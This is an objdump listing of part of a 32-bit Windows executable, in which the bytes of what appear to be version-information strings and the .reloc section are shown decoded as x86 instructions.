  416316:	xor    BYTE PTR [eax],al
  416318:	xor    al,0x0
  41631a:	inc    edx
  41631b:	add    BYTE PTR [eax],dh
  41631d:	add    BYTE PTR [eax],al
  41631f:	add    BYTE PTR [eax+eax*1+0x16],cl
  416323:	add    BYTE PTR [ecx],al
  416325:	add    BYTE PTR [ebx+0x0],al
  416328:	outs   dx,DWORD PTR ds:[esi]
  416329:	add    BYTE PTR [ebp+0x0],ch
  41632c:	jo     0x41632e
  41632e:	popa   
  41632f:	add    BYTE PTR [esi+0x0],ch
  416332:	jns    0x416334
  416334:	dec    esi
  416335:	add    BYTE PTR [ecx+0x0],ah
  416338:	ins    DWORD PTR es:[edi],dx
  416339:	add    BYTE PTR [ebp+0x0],ah
  41633c:	add    BYTE PTR [eax],al
  41633e:	add    BYTE PTR [eax],al
  416340:	dec    ebp
  416341:	add    BYTE PTR [ecx+0x0],ch
  416344:	arpl   WORD PTR [eax],ax
  416346:	jb     0x416348
  416348:	outs   dx,DWORD PTR ds:[esi]
  416349:	add    BYTE PTR [ebx+0x0],dh
  41634c:	outs   dx,DWORD PTR ds:[esi]
  41634d:	add    BYTE PTR [esi+0x0],ah
  416350:	je     0x416352
  416352:	and    BYTE PTR [eax],al
  416354:	inc    ebx
  416355:	add    BYTE PTR [edi+0x0],ch
  416358:	jb     0x41635a
  41635a:	jo     0x41635c
  41635c:	outs   dx,DWORD PTR ds:[esi]
  41635d:	add    BYTE PTR [edx+0x0],dh
  416360:	popa   
  416361:	add    BYTE PTR [eax+eax*1+0x69],dh
  416365:	add    BYTE PTR [edi+0x0],ch
  416368:	outs   dx,BYTE PTR ds:[esi]
  416369:	add    BYTE PTR [eax],al
  41636b:	add    BYTE PTR [edx+0x0],bl
  41636e:	sbb    DWORD PTR [eax],eax
  416370:	add    DWORD PTR [eax],eax
  416372:	inc    esi
  416373:	add    BYTE PTR [ecx+0x0],ch
  416376:	ins    BYTE PTR es:[edi],dx
  416377:	add    BYTE PTR [ebp+0x0],ah
  41637a:	inc    esp
  41637b:	add    BYTE PTR [ebp+0x0],ah
  41637e:	jae    0x416380
  416380:	arpl   WORD PTR [eax],ax
  416382:	jb     0x416384
  416384:	imul   eax,DWORD PTR [eax],0x740070
  41638a:	imul   eax,DWORD PTR [eax],0x6e006f
  416390:	add    BYTE PTR [eax],al
  416392:	add    BYTE PTR [eax],al
  416394:	inc    ebx
  416395:	add    BYTE PTR [eax+0x0],ch
  416398:	popa   
  416399:	add    BYTE PTR [esi+0x0],ch
  41639c:	add    BYTE PTR [di+0x0],ah
  4163a0:	and    BYTE PTR [eax],al
  4163a2:	inc    ebx
  4163a3:	add    BYTE PTR [edi+0x0],ch
  4163a6:	ins    DWORD PTR es:[edi],dx
  4163a7:	add    BYTE PTR [eax+0x0],dh
  4163aa:	jne    0x4163ac
  4163ac:	je     0x4163ae
  4163ae:	add    BYTE PTR gs:[edx+0x0],dh
  4163b2:	and    BYTE PTR [eax],al
  4163b4:	push   ebx
  4163b5:	add    BYTE PTR [ebp+0x0],ah
  4163b8:	je     0x4163ba
  4163ba:	je     0x4163bc
  4163bc:	imul   eax,DWORD PTR [eax],0x67006e
  4163c2:	jae    0x4163c4
  4163c4:	add    BYTE PTR [eax],al
  4163c6:	add    BYTE PTR [eax],al
  4163c8:	data16 add BYTE PTR [ebx],ah
  4163cb:	add    BYTE PTR [ecx],al
  4163cd:	add    BYTE PTR [esi+0x0],al
  4163d0:	imul   eax,DWORD PTR [eax],0x65006c
  4163d6:	push   esi
  4163d7:	add    BYTE PTR [ebp+0x0],ah
  4163da:	jb     0x4163dc
  4163dc:	jae    0x4163de
  4163de:	imul   eax,DWORD PTR [eax],0x6e006f
  4163e4:	add    BYTE PTR [eax],al
  4163e6:	add    BYTE PTR [eax],al
  4163e8:	xor    DWORD PTR [eax],eax
  4163ea:	xor    BYTE PTR [eax],al
  4163ec:	add    BYTE PTR cs:[eax],dh
  4163ef:	add    BYTE PTR [esi],ch
  4163f1:	add    BYTE PTR [ecx],dh
  4163f3:	add    BYTE PTR [eax],dh
  4163f5:	add    BYTE PTR [edx],dh
  4163f7:	add    BYTE PTR [eax+eax*1],dh
  4163fa:	xor    BYTE PTR [eax],al
  4163fc:	add    BYTE PTR cs:[ecx],dh
  4163ff:	add    BYTE PTR [esi],dh
  416401:	add    BYTE PTR [ebx],dh
  416403:	add    BYTE PTR [eax],bh
  416405:	add    BYTE PTR [eax+eax*1],dh
  416408:	and    BYTE PTR [eax],al
  41640a:	sub    BYTE PTR [eax],al
  41640c:	je     0x41640e
  41640e:	push   0x2e003100
  416413:	add    BYTE PTR [ecx],dh
  416415:	add    BYTE PTR ds:0x37003000,dh
  41641b:	add    BYTE PTR [eax],dh
  41641d:	add    BYTE PTR [ecx],bh
  41641f:	add    BYTE PTR ds:0x37003100,ch
  416425:	add    BYTE PTR [eax],dh
  416427:	add    BYTE PTR [eax],dh
  416429:	add    BYTE PTR [ecx],ch
  41642b:	add    BYTE PTR [eax],al
  41642d:	add    BYTE PTR [eax],al
  41642f:	add    BYTE PTR [edx+0x0],bl
  416432:	sbb    eax,0x49000100
  416437:	add    BYTE PTR [esi+0x0],ch
  41643a:	je     0x41643c
  41643c:	add    BYTE PTR gs:[edx+0x0],dh
  416440:	outs   dx,BYTE PTR ds:[esi]
  416441:	add    BYTE PTR [ecx+0x0],ah
  416444:	ins    BYTE PTR es:[edi],dx
  416445:	add    BYTE PTR [esi+0x0],cl
  416448:	popa   
  416449:	add    BYTE PTR [ebp+0x0],ch
  41644c:	add    BYTE PTR gs:[eax],al
  41644f:	add    BYTE PTR [ebx+0x0],dl
  416452:	jns    0x416454
  416454:	jae    0x416456
  416456:	je     0x416458
  416458:	add    BYTE PTR gs:[ebp+0x0],ch
  41645c:	push   eax
  41645d:	add    BYTE PTR [edx+0x0],dh
  416460:	outs   dx,DWORD PTR ds:[esi]
  416461:	add    BYTE PTR [eax+0x0],dh
  416464:	add    BYTE PTR gs:[edx+0x0],dh
  416468:	je     0x41646a
  41646a:	imul   eax,DWORD PTR [eax],0x730065
  416470:	inc    ebx
  416471:	add    BYTE PTR [edi+0x0],ch
  416474:	ins    DWORD PTR es:[edi],dx
  416475:	add    BYTE PTR [eax+0x0],dh
  416478:	jne    0x41647a
  41647a:	je     0x41647c
  41647c:	add    BYTE PTR gs:[edx+0x0],dh
  416480:	dec    esi
  416481:	add    BYTE PTR [ecx+0x0],ah
  416484:	ins    DWORD PTR es:[edi],dx
  416485:	add    BYTE PTR [ebp+0x0],ah
  416488:	add    BYTE PTR [eax],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	add    BYTE PTR [eax],0x2e
  41648f:	add    BYTE PTR [ecx],al
  416491:	add    BYTE PTR [eax+eax*1+0x65],cl
  416495:	add    BYTE PTR [edi+0x0],ah
  416498:	popa   
  416499:	add    BYTE PTR [eax+eax*1+0x43],ch
  41649d:	add    BYTE PTR [edi+0x0],ch
  4164a0:	jo     0x4164a2
  4164a2:	jns    0x4164a4
  4164a4:	jb     0x4164a6
  4164a6:	imul   eax,DWORD PTR [eax],0x680067
  4164ac:	je     0x4164ae
  4164ae:	add    BYTE PTR [eax],al
  4164b0:	test   eax,0x4d002000
  4164b5:	add    BYTE PTR [ecx+0x0],ch
  4164b8:	arpl   WORD PTR [eax],ax
  4164ba:	jb     0x4164bc
  4164bc:	outs   dx,DWORD PTR ds:[esi]
  4164bd:	add    BYTE PTR [ebx+0x0],dh
  4164c0:	outs   dx,DWORD PTR ds:[esi]
  4164c1:	add    BYTE PTR [esi+0x0],ah
  4164c4:	je     0x4164c6
  4164c6:	and    BYTE PTR [eax],al
  4164c8:	inc    ebx
  4164c9:	add    BYTE PTR [edi+0x0],ch
  4164cc:	jb     0x4164ce
  4164ce:	jo     0x4164d0
  4164d0:	outs   dx,DWORD PTR ds:[esi]
  4164d1:	add    BYTE PTR [edx+0x0],dh
  4164d4:	popa   
  4164d5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4164d9:	add    BYTE PTR [edi+0x0],ch
  4164dc:	outs   dx,BYTE PTR ds:[esi]
  4164dd:	add    BYTE PTR [esi],ch
  4164df:	add    BYTE PTR [eax],ah
  4164e1:	add    BYTE PTR [ecx+0x0],al
  4164e4:	ins    BYTE PTR es:[edi],dx
  4164e5:	add    BYTE PTR [eax+eax*1+0x20],ch
  4164e9:	add    BYTE PTR [edx+0x0],dh
  4164ec:	imul   eax,DWORD PTR [eax],0x680067
  4164f2:	je     0x4164f4
  4164f4:	jae    0x4164f6
  4164f6:	and    BYTE PTR [eax],al
  4164f8:	jb     0x4164fa
  4164fa:	add    BYTE PTR gs:[ebx+0x0],dh
  4164fe:	add    BYTE PTR gs:[edx+0x0],dh
  416502:	jbe    0x416504
  416504:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  416509:	add    BYTE PTR [eax],al
  41650b:	add    BYTE PTR [edx+0x0],ch
  41650e:	and    DWORD PTR [eax],eax
  416510:	add    DWORD PTR [eax],eax
  416512:	dec    edi
  416513:	add    BYTE PTR [edx+0x0],dh
  416516:	imul   eax,DWORD PTR [eax],0x690067
  41651c:	outs   dx,BYTE PTR ds:[esi]
  41651d:	add    BYTE PTR [ecx+0x0],ah
  416520:	ins    BYTE PTR es:[edi],dx
  416521:	add    BYTE PTR [esi+0x0],al
  416524:	imul   eax,DWORD PTR [eax],0x65006c
  41652a:	outs   dx,BYTE PTR ds:[esi]
  41652b:	add    BYTE PTR [ecx+0x0],ah
  41652e:	ins    DWORD PTR es:[edi],dx
  41652f:	add    BYTE PTR [ebp+0x0],ah
  416532:	add    BYTE PTR [eax],al
  416534:	push   ebx
  416535:	add    BYTE PTR [ecx+0x0],bh
  416538:	jae    0x41653a
  41653a:	je     0x41653c
  41653c:	add    BYTE PTR gs:[ebp+0x0],ch
  416540:	push   eax
  416541:	add    BYTE PTR [edx+0x0],dh
  416544:	outs   dx,DWORD PTR ds:[esi]
  416545:	add    BYTE PTR [eax+0x0],dh
  416548:	add    BYTE PTR gs:[edx+0x0],dh
  41654c:	je     0x41654e
  41654e:	imul   eax,DWORD PTR [eax],0x730065
  416554:	inc    ebx
  416555:	add    BYTE PTR [edi+0x0],ch
  416558:	ins    DWORD PTR es:[edi],dx
  416559:	add    BYTE PTR [eax+0x0],dh
  41655c:	jne    0x41655e
  41655e:	je     0x416560
  416560:	add    BYTE PTR gs:[edx+0x0],dh
  416564:	dec    esi
  416565:	add    BYTE PTR [ecx+0x0],ah
  416568:	ins    DWORD PTR es:[edi],dx
  416569:	add    BYTE PTR [ebp+0x0],ah
  41656c:	add    BYTE PTR cs:[ebp+0x0],al
  416570:	pop    eax
  416571:	add    BYTE PTR [ebp+0x0],al
  416574:	add    BYTE PTR [eax],al
  416576:	add    BYTE PTR [eax],al
  416578:	push   0x0
  41657a:	and    eax,0x50000100
  41657f:	add    BYTE PTR [edx+0x0],dh
  416582:	outs   dx,DWORD PTR ds:[esi]
  416583:	add    BYTE PTR [eax+eax*1+0x75],ah
  416587:	add    BYTE PTR [ebx+0x0],ah
  41658a:	je     0x41658c
  41658c:	dec    esi
  41658d:	add    BYTE PTR [ecx+0x0],ah
  416590:	ins    DWORD PTR es:[edi],dx
  416591:	add    BYTE PTR [ebp+0x0],ah
  416594:	add    BYTE PTR [eax],al
  416596:	add    BYTE PTR [eax],al
  416598:	dec    ebp
  416599:	add    BYTE PTR [ecx+0x0],ch
  41659c:	arpl   WORD PTR [eax],ax
  41659e:	jb     0x4165a0
  4165a0:	outs   dx,DWORD PTR ds:[esi]
  4165a1:	add    BYTE PTR [ebx+0x0],dh
  4165a4:	outs   dx,DWORD PTR ds:[esi]
  4165a5:	add    BYTE PTR [esi+0x0],ah
  4165a8:	je     0x4165aa
  4165aa:	scas   al,BYTE PTR es:[edi]
  4165ab:	add    BYTE PTR [eax],ah
  4165ad:	add    BYTE PTR [edi+0x0],dl
  4165b0:	imul   eax,DWORD PTR [eax],0x64006e
  4165b6:	outs   dx,DWORD PTR ds:[esi]
  4165b7:	add    BYTE PTR [edi+0x0],dh
  4165ba:	jae    0x4165bc
  4165bc:	scas   al,BYTE PTR es:[edi]
  4165bd:	add    BYTE PTR [eax],ah
  4165bf:	add    BYTE PTR [edi+0x0],cl
  4165c2:	jo     0x4165c4
  4165c4:	add    BYTE PTR gs:[edx+0x0],dh
  4165c8:	popa   
  4165c9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4165cd:	add    BYTE PTR [esi+0x0],ch
  4165d0:	add    BYTE PTR [bx+si],ah
  4165d3:	add    BYTE PTR [ebx+0x0],dl
  4165d6:	jns    0x4165d8
  4165d8:	jae    0x4165da
  4165da:	je     0x4165dc
  4165dc:	add    BYTE PTR gs:[ebp+0x0],ch
  4165e0:	add    BYTE PTR [eax],al
  4165e2:	add    BYTE PTR [eax],al
  4165e4:	inc    esi
  4165e5:	add    BYTE PTR [ecx],dl
  4165e7:	add    BYTE PTR [ecx],al
  4165e9:	add    BYTE PTR [eax+0x0],dl
  4165ec:	jb     0x4165ee
  4165ee:	outs   dx,DWORD PTR ds:[esi]
  4165ef:	add    BYTE PTR [eax+eax*1+0x75],ah
  4165f3:	add    BYTE PTR [ebx+0x0],ah
  4165f6:	je     0x4165f8
  4165f8:	push   esi
  4165f9:	add    BYTE PTR [ebp+0x0],ah
  4165fc:	jb     0x4165fe
  4165fe:	jae    0x416600
  416600:	imul   eax,DWORD PTR [eax],0x6e006f
  416606:	add    BYTE PTR [eax],al
  416608:	xor    DWORD PTR [eax],eax
  41660a:	xor    BYTE PTR [eax],al
  41660c:	add    BYTE PTR cs:[eax],dh
  41660f:	add    BYTE PTR [esi],ch
  416611:	add    BYTE PTR [ecx],dh
  416613:	add    BYTE PTR [eax],dh
  416615:	add    BYTE PTR [edx],dh
  416617:	add    BYTE PTR [eax+eax*1],dh
  41661a:	xor    BYTE PTR [eax],al
  41661c:	add    BYTE PTR cs:[ecx],dh
  41661f:	add    BYTE PTR [esi],dh
  416621:	add    BYTE PTR [ebx],dh
  416623:	add    BYTE PTR [eax],bh
  416625:	add    BYTE PTR [eax+eax*1],dh
  416628:	add    BYTE PTR [eax],al
  41662a:	add    BYTE PTR [eax],al
  41662c:	inc    esp
  41662d:	add    BYTE PTR [eax],al
  41662f:	add    BYTE PTR [ecx],al
  416631:	add    BYTE PTR [esi+0x0],dl
  416634:	popa   
  416635:	add    BYTE PTR [edx+0x0],dh
  416638:	inc    esi
  416639:	add    BYTE PTR [ecx+0x0],ch
  41663c:	ins    BYTE PTR es:[edi],dx
  41663d:	add    BYTE PTR [ebp+0x0],ah
  416640:	dec    ecx
  416641:	add    BYTE PTR [esi+0x0],ch
  416644:	data16 add BYTE PTR [edi+0x0],ch
  416648:	add    BYTE PTR [eax],al
  41664a:	add    BYTE PTR [eax],al
  41664c:	and    al,0x0
  41664e:	add    al,0x0
  416650:	add    BYTE PTR [eax],al
  416652:	push   esp
  416653:	add    BYTE PTR [edx+0x0],dh
  416656:	popa   
  416657:	add    BYTE PTR [esi+0x0],ch
  41665a:	jae    0x41665c
  41665c:	ins    BYTE PTR es:[edi],dx
  41665d:	add    BYTE PTR [ecx+0x0],ah
  416660:	je     0x416662
  416662:	imul   eax,DWORD PTR [eax],0x6e006f
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [eax],al
  41666c:	or     DWORD PTR [eax+esi*4],eax
  41666f:	add    al,0xcd
  416671:	dec    ch
  416673:	(bad)  
  416674:	rol    BYTE PTR [eax],1
  416676:	add    BYTE PTR [eax],al
  416678:	add    BYTE PTR [eax],al
  41667a:	add    DWORD PTR [eax],eax
  41667c:	add    BYTE PTR [eax],al
  41667e:	add    BYTE PTR [eax],al
  416680:	adc    DWORD PTR [eax],eax
  416682:	add    BYTE PTR [eax],al
  416684:	add    BYTE PTR [eax],al
  416686:	add    BYTE PTR [eax],al
  416688:	add    al,BYTE PTR [eax]
  41668a:	add    BYTE PTR [eax],al
  41668c:	mov    dh,0x60
  41668e:	sub    ebx,esi
  416690:	cmp    esp,eax
  416692:	jecxz  0x416684
  416694:	imul   DWORD PTR [edi+ebp*2-0x54]
  416698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416699:	xor    eax,0xe39d061f
  41669e:	pushf  
  41669f:	popf   
  4166a0:	sub    dh,BYTE PTR [edi+0x61]
  4166a3:	mov    cl,0x29
  4166a5:	(bad)  [eax+0x47ac0917]
	...
  4166c3:	add    BYTE PTR [eax+0xe000000],cl
  4166c9:	add    BYTE PTR [eax],al
  4166cb:	add    BYTE PTR [eax+0x10000000],bl
  4166d1:	add    BYTE PTR [eax],al
  4166d3:	add    BYTE PTR [eax+0xe000000],ch
  4166d9:	add    BYTE PTR [eax],al
  4166db:	add    BYTE PTR [eax+0x8000000],bh
	...
  4166e9:	add    BYTE PTR [eax],al
  4166eb:	add    al,al
  4166ed:	add    BYTE PTR [eax],al
  4166ef:	add    BYTE PTR [eax+eax*1],cl
  4166f2:	add    BYTE PTR [eax],al
  4166f4:	add    BYTE PTR [eax],al
  4166f6:	add    BYTE PTR [eax],al
  4166f8:	dec    ebp
  4166f9:	add    BYTE PTR [ebp+0x0],dl
  4166fc:	dec    ecx
	...
  416705:	add    BYTE PTR [eax],al
  416707:	add    BYTE PTR [ebx],al
  416709:	add    BYTE PTR [eax],al
  41670b:	add    BYTE PTR [esi],cl
  41670d:	add    BYTE PTR [eax],al
  41670f:	add    BYTE PTR [eax],dl
  416711:	add    BYTE PTR [eax],al
  416713:	add    BYTE PTR [eax],bl
  416715:	add    BYTE PTR [eax],al
  416717:	add    BYTE PTR [ebp+0x0],cl
  41671a:	push   ebp
  41671b:	add    BYTE PTR [ecx+0x0],cl
	...
  416726:	add    BYTE PTR [eax],al
  416728:	push   es
  416729:	add    BYTE PTR [eax],al
  41672b:	add    BYTE PTR [eax],dl
  41672d:	add    BYTE PTR [eax],al
  41672f:	add    BYTE PTR [ebp+0x0],ah
  416732:	outs   dx,BYTE PTR ds:[esi]
  416733:	add    BYTE PTR ds:0x53005500,ch
  416739:	add    BYTE PTR [eax],al
  41673b:	add    BYTE PTR [eax],al
  41673d:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00417000 <.reloc>:
  417000:	add    BYTE PTR [eax],dl
  417002:	add    BYTE PTR [eax],al
  417004:	sub    al,0x1
  417006:	add    BYTE PTR [eax],al
  417008:	add    al,0x30
  41700a:	adc    BYTE PTR [eax],dh
  41700c:	adc    al,0x30
  41700e:	inc    eax
  41700f:	xor    BYTE PTR [eax+esi*1+0x4],al
  417013:	xor    DWORD PTR [eax],ecx
  417015:	xor    DWORD PTR [eax],edx
  417017:	xor    DWORD PTR [eax],ebx
  417019:	xor    DWORD PTR [esi+0x33],edx
  41701c:	pop    esp
  41701d:	xor    edi,DWORD PTR [eax+0x33]
  417020:	test   BYTE PTR [ebx],dh
  417022:	mov    dh,BYTE PTR [ebx]
  417024:	xchg   edi,eax
  417025:	xor    ebp,DWORD PTR [ebp-0x3fcc49cd]
  41702b:	xor    ecx,ecx
  41702d:	xor    edx,ebx
  41702f:	xor    ebx,edi
  417031:	xor    esp,ebp
  417033:	xor    ebp,esp
  417035:	xor    esi,ebp
  417037:	xor    edi,ebx
  417039:	xor    eax,DWORD PTR [ebx]
  41703b:	xor    al,0x9
  41703d:	xor    al,0x16
  41703f:	xor    al,0x1e
  417041:	xor    al,0x24
  417043:	xor    al,0x41
  417045:	xor    al,0x46
  417047:	xor    al,0x4c
  417049:	xor    al,0x51
  41704b:	xor    al,0x56
  41704d:	xor    al,0x5b
  41704f:	xor    al,0x60
  417051:	xor    al,0x66
  417053:	xor    al,0x6e
  417055:	xor    al,0x7b
  417057:	xor    al,0x92
  417059:	xor    al,0xaf
  41705b:	xor    al,0xc7
  41705d:	xor    al,0xde
  41705f:	xor    al,0xe6
  417061:	xor    al,0xef
  417063:	xor    al,0xf4
  417065:	xor    al,0xf9
  417067:	xor    al,0xf
  417069:	xor    eax,0x351c3515
  41706e:	and    DWORD PTR ds:0x353d352e,esi
  417074:	inc    ebp
  417075:	xor    eax,0x3563354d
  41707a:	imul   esi,DWORD PTR ds:0x35c33572,0xffffffcd
  417081:	xor    eax,0x35dd35d3
  417086:	adc    eax,0x25361b36
  41708b:	sub    esi,DWORD PTR ss:[esi]
  41708e:	xor    al,0x36
  417090:	cmp    DWORD PTR [esi],esi
  417092:	imul   esi,DWORD PTR [esi],0xffffff8e
  417095:	shl    BYTE PTR ss:[esi],cl
  417098:	sub    DWORD PTR [edi],esi
  41709a:	inc    ecx
  41709b:	aaa    
  41709c:	inc    edi
  41709d:	aaa    
  41709e:	push   esi
  41709f:	aaa    
  4170a0:	bound  esi,QWORD PTR [edi]
  4170a2:	xlat   BYTE PTR ds:[ebx]
  4170a3:	aaa    
  4170a4:	or     al,0x38
  4170a6:	mov    BYTE PTR [eax],bh
  4170a8:	lea    edi,[eax]
  4170aa:	lahf   
  4170ab:	cmp    BYTE PTR [ebp-0x28c72ec8],bh
  4170b1:	cmp    BYTE PTR [ecx-0x3fc64bc7],bl
  4170b7:	cmp    edi,ecx
  4170b9:	cmp    eax,ebx
  4170bb:	cmp    ecx,esp
  4170bd:	cmp    esi,esi
  4170bf:	cmp    DWORD PTR [ebx],ecx
  4170c1:	cmp    bl,BYTE PTR [eax]
  4170c3:	cmp    ah,BYTE PTR [eax]
  4170c5:	cmp    bh,BYTE PTR [ebx]
  4170c7:	cmp    cl,BYTE PTR [edx+0x3a]
  4170ca:	push   ebp
  4170cb:	cmp    dh,BYTE PTR [edx+0x3a]
  4170ce:	ret    0xc73a
  4170d1:	cmp    ch,bh
  4170d3:	cmp    bh,al
  4170d5:	cmp    al,BYTE PTR [ebx]
  4170d7:	cmp    ecx,DWORD PTR [edx]
  4170d9:	cmp    esp,DWORD PTR [ecx]
  4170db:	cmp    esp,DWORD PTR [edi]
  4170dd:	cmp    ebp,DWORD PTR ds:0x393b333b
  4170e3:	cmp    edi,DWORD PTR [edi]
  4170e5:	cmp    eax,DWORD PTR [esi+0x3b]
  4170e8:	dec    ebp
  4170e9:	cmp    edx,DWORD PTR [ebx+edi*1+0x5b]
  4170ed:	cmp    esp,DWORD PTR [edx+0x3b]
  4170f0:	imul   edi,DWORD PTR [ebx],0x3b783b70
  4170f6:	cmp    BYTE PTR [ebx],0x88
  4170f9:	cmp    edx,DWORD PTR [ebx+edi*1+0x3ba23b9d]
  417100:	test   al,0x3b
  417102:	mov    dl,0x3b
  417104:	mov    esp,0xdc3bcc3b
  417109:	cmp    esp,edx
  41710b:	cmp    ebp,ebp
  41710d:	cmp    esi,ebx
  41710f:	cmp    edi,edi
  417111:	cmp    ecx,DWORD PTR [edi]
  417113:	cmp    al,0x18
  417115:	cmp    al,0x2d
  417117:	cmp    al,0x4a
  417119:	cmp    al,0x8c
  41711b:	cmp    al,0xa4
  41711d:	cmp    al,0xa8
  41711f:	cmp    al,0xb0
  417121:	cmp    al,0xb4
  417123:	cmp    al,0xcc
  417125:	cmp    al,0xd0
  417127:	cmp    al,0xec
  417129:	cmp    al,0xf0
  41712b:	cmp    al,0x0
  41712d:	xor    BYTE PTR [eax],al
  41712f:	add    BYTE PTR [eax+eax*1],cl
  417132:	add    BYTE PTR [eax],al
  417134:	nop
  417135:	xor    BYTE PTR [eax],al
	...
